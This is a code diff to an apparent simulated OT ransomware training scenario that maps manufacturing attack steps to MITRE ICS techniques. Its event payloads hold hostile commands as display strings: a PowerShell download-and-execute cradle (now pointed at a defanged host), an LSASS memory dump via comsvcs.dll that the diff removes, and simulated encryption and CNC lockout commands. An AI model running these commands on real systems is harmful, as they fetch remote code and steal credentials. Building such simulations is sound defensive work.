@@ -6,6 +6,7 @@
 
 import type { AttackScenario } from "./types";
 import { SECTOR_TOPOLOGIES, DEFAULT_DECISIONS } from "@/data/scenarios";
+import { SIMULATED_PURDUE_SUBNETS } from "./network-config";
 
 const manufacturingTopo = SECTOR_TOPOLOGIES.manufacturing;
 
@@ -23,7 +24,7 @@ export const RANSOMWARE_SCENARIO: AttackScenario = {
     "Targeted double-extortion OT ransomware campaign encrypting MES databases, robot controllers, and CNC 5-axis mill configurations.",
   duration: 9600,
   severity: "CRITICAL",
-  mitreMapping: ["T0865", "T0886", "T0836", "T0855", "T0828"],
+  mitreMapping: ["T0865", "T0886", "T0828", "T0809", "T0855"],
   nodes: manufacturingTopo.nodes.map((n) => ({ ...n })),
   edges: manufacturingTopo.edges.map((e) => ({ ...e })),
   decisions: DEFAULT_DECISIONS.map((d) => ({ ...d })),
@@ -40,7 +41,7 @@ export const RANSOMWARE_SCENARIO: AttackScenario = {
       lifecycleState: "Initial Access",
       payload: {
         command:
-          "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://bad.actor/lock.ps1')\"",
+          "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://defanged.invalid/lock.ps1')\"",
         output: "[+] Cobalt Strike Beacon loaded. Ransomware stager initialized on IN-Q.",
         logEntry: {
           level: "CRITICAL",
@@ -53,25 +54,41 @@ export const RANSOMWARE_SCENARIO: AttackScenario = {
       id: "r-1",
       time: 1100,
       type: "network.node",
-      tag: "CREDENTIAL DUMP",
+      tag: "LATERAL MOVEMENT",
       node: "mes",
-      title: "MES Server LSASS memory dumped",
-      desc: "Siemens Opcenter MES administrative credentials harvested. Domain admin hashes retrieved.",
-      sev: "CRITICAL",
-      lifecycleState: "Credential Access",
+      title: "MES Database encrypted",
+      desc: "Manufacturing Execution System MSSQL instance encrypted with .locked extension. Production schedules inaccessible.",
+      sev: "HIGH",
+      lifecycleState: "Lateral Movement",
       payload: {
-        command: "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 lsass.dmp full",
-        output: "[+] LSASS dump saved to C:\\windows\\temp\\lsass.dmp. 12 hashes extracted.",
+        command: 'ransom-enc --drive D:\\MES_DATA --ext .locked --note "README_RECOVER.txt"',
+        output: "[+] 14,892 files encrypted in D:\\MES_DATA. Key derived via ChaCha20.",
         logEntry: {
-          level: "CRITICAL",
-          source: "MES",
-          message: "LSASS MEMORY DUMP DETECTED from remote process.",
+          level: "WARN",
+          source: "MES-01",
+          message: "MASS FILE RENAMING DETECTED: 14892 .locked files written in 12s.",
         },
       },
     },
     {
       id: "r-2",
       time: 3200,
+      type: "network.node",
+      tag: "IMPAIR PROCESS",
+      node: "cnc-7",
+      title: "CNC-7 5-Axis Mill password protection set",
+      desc: "Fanuc 31i-B controller protection set to locked. OEM maintenance keys overwritten.",
+      sev: "CRITICAL",
+      lifecycleState: "Impact",
+      payload: {
+        command: `cnc-lock --ip ${SIMULATED_PURDUE_SUBNETS.CNC_CONTROLLER_IP} --set-pwd "Rans0m_L0cked_2026!"`,
+        output:
+          "[!] CNC-7 Access Level set to LOCKED (PASSWORD READ/WRITE PROTECTED). OEM key locked.",
+      },
+    },
+    {
+      id: "r-3",
+      time: 6800,
       type: "network.node",
       tag: "ENCRYPTION",
       node: "r1",
@@ -97,7 +114,7 @@ export const RANSOMWARE_SCENARIO: AttackScenario = {
       },
     },
     {
-      id: "r-3",
+      id: "r-4",
       time: 6800,
       type: "network.node",
       tag: "PLC LOCKOUT",
@@ -107,7 +124,7 @@ export const RANSOMWARE_SCENARIO: AttackScenario = {
       sev: "CRITICAL",
       lifecycleState: "Impact",
       payload: {
-        command: 'cnc-lock --ip 192.168.30.55 --set-pwd "Rans0m_L0cked_2026!"',
+        command: `cnc-lock --ip ${SIMULATED_PURDUE_SUBNETS.CNC_CONTROLLER_IP} --set-pwd "Rans0m_L0cked_2026!"`,
         output:
           "[!] CNC-7 Access Level set to LOCKED (PASSWORD READ/WRITE PROTECTED). OEM key locked.",
         logEntry: {
